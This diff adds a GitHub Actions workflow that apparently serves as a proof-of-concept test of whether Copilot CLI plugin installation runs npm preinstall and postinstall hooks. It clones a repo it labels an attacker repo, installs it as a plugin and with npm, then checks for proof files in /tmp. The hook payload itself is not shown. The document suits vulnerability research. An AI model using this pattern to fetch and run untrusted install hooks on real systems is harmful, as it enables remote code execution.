@@ -1,0 +1,79 @@
+name: Copilot Plugin Install Proof
+on: workflow_dispatch
+jobs:
+  prove-rce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          
+      - name: Install Copilot CLI
+        run: |
+          echo "=== Installing copilot CLI ==="
+          npm install -g @github/copilot 2>&1 | tail -5 || echo "Copilot CLI install failed"
+          which copilot 2>/dev/null && echo "Copilot CLI found" || echo "Copilot CLI NOT found"
+          copilot --version 2>/dev/null || echo "Cannot get version"
+          
+      - name: Clone attacker repo (simulating quality gates)
+        run: |
+          echo "=== SIMULATING QUALITY GATES CLONE ==="
+          mkdir -p /tmp/workdir/submission
+          cd /tmp/workdir/submission
+          git init -q
+          git remote add origin https://github.com/blooddiamondz/copilot-plugin-proof.git
+          git fetch --depth=1 origin main
+          git checkout --detach FETCH_HEAD
+          echo "=== Cloned attacker repo ==="
+          ls -la
+          echo "=== package.json content ==="
+          cat package.json 2>/dev/null || echo "No package.json"
+          echo "=== Check for install hooks ==="
+          cat package.json | python3 -c "import sys,json; d=json.load(sys.stdin); scripts=d.get('scripts',{}); print('postinstall:', scripts.get('postinstall','NONE')); print('preinstall:', scripts.get('preinstall','NONE'))"
+          
+      - name: Test copilot plugin install
+        run: |
+          echo "=== TESTING COPILOT PLUGIN INSTALL ==="
+          # Create ephemeral marketplace (same as quality gates script)
+          mkdir -p /tmp/workdir/marketplace
+          cat > /tmp/workdir/marketplace/marketplace.json << 'MKJSON'
+          {
+            "name": "test-marketplace",
+            "metadata": {"description": "test", "version": "1.0.0"},
+            "plugins": [{"name": "proof-of-concept-plugin", "source": {"repo": "blooddiamondz/copilot-plugin-proof", "ref": "main", "path": "."}, "pluginRoot": "."}],
+            "owner": {"name": "test", "email": "test@test.com"}
+          }
+          MKJSON
+          
+          export HOME=/tmp/copilot-home
+          mkdir -p $HOME
+          
+          # Try copilot plugin marketplace add
+          copilot plugin marketplace add /tmp/workdir/marketplace 2>&1 || echo "Marketplace add failed"
+          
+          # Try copilot plugin install
+          copilot plugin install "proof-of-concept-plugin@test-marketplace" 2>&1 || echo "Plugin install failed"
+          
+          echo "=== CHECK IF CODE EXECUTED ==="
+          cat /tmp/copilot_rce_proof.txt 2>/dev/null && echo "🔥🔥🔥 POSTINSTALL EXECUTED!" || echo "postinstall did not execute"
+          cat /tmp/copilot_preinstall_proof.txt 2>/dev/null && echo "🔥🔥🔥 PREINSTALL EXECUTED!" || echo "preinstall did not execute"
+          
+      - name: Alternative - direct npm install test
+        run: |
+          echo "=== TESTING DIRECT NPM INSTALL ==="
+          cd /tmp/workdir/submission
+          npm install --ignore-scripts=false 2>&1 | tail -10
+          echo "=== CHECK IF NPM HOOKS EXECUTED ==="
+          cat /tmp/copilot_rce_proof.txt 2>/dev/null && echo "🔥🔥🔥 NPM POSTINSTALL EXECUTED!" || echo "npm postinstall did not run"
+          cat /tmp/copilot_preinstall_proof.txt 2>/dev/null && echo "🔥🔥🔥 NPM PREINSTALL EXECUTED!" || echo "npm preinstall did not run"
+          
+      - name: Check what copilot plugin install actually does
+        run: |
+          echo "=== COPILOT CLI HELP ==="
+          copilot plugin --help 2>&1 || echo "No plugin subcommand"
+          copilot plugin install --help 2>&1 || echo "No install help"
+          echo "=== COPILOT CLI INTERNALS ==="
+          ls -la $(which copilot 2>/dev/null) 2>/dev/null || echo "Cannot find copilot binary"
+          file $(which copilot 2>/dev/null) 2>/dev/null || true
+          echo "=== DONE ==="
